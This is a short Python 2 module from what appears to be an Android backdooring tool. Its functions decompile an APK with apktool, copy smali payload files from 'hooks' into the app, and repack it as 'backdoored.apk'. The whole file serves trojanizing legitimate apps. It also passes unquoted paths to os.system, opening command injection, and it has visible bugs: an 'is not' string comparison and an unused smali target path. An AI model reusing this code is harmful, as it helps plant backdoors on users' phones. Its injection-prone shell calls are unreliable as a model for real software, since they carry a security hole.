import os

def decompile_apk(apkPath):
    """
    Decompile the .apk file given as parameter.
    The function will throw an :class:'Exception' on any error.

    :param apkPath: Path to the original apk file.
    :type apkPath: str

    :return The path to the directory containing the decompiled applicaiton
    """
    if not os.path.isfile(apkPath):
        raise Exception("Cannot find apk file at path {}".format(apkPath))
    outDir = os.path.join(os.path.splitext(apkPath)[0], "_decompiled")
    os.system("apktool d -o {} {}".format(outDir, apkPath))
    return outDir

def repack_apk(decompiled_path, hooks):
    """
    Build/Repack the decompiled application given as parameter.
    The function will throw an :class:'Exception' on any error.

    :param decompiled_path: The path to the directory to the decompiled application.
    :type decompiled_path: str

    :param hooks: The hooks we inserted beforehand. Those contain the paths to the smali files we need to copy.
    :type hooks: :type hooks: [:class:'hookmanager.Hook']

    :return The path to the repacked .apk file.
    """
    if not os.path.isdir(decompiled_path):
        raise Exception("Cannot find the decompiled apk at path {}".format(decompiled_path))

    __inject_payload(decompiled_path, hooks)
    repackedApk = "backdoored.apk"
    print decompiled_path, repackedApk
    os.system("apktool b -o {} {}".format(repackedApk, decompiled_path))
    return repackedApk

def __inject_payload(original_apk, hooks):
    """
        Copy the smali sources of the payload to the original application before building.

        :param original_apk: Path to the decompiled original apk.
        :type original_apk: str

        :param hooks: The hooks we inserted beforehand. Those contain the paths to the smali files we need to copy.
        :type hooks: :type hooks: [:class:'hookmanager.Hook']
    """

    original = os.path.join(original_apk, "smali")
    payload_paths = set([h.get_payload_path() for h in hooks])
    for path in payload_paths:
        payload = os.path.join(path, "smali")
        for subf in os.listdir(payload):
            if subf is not "android":
                os.system("cp -r {} {}".format(os.path.join(payload, subf), original_apk))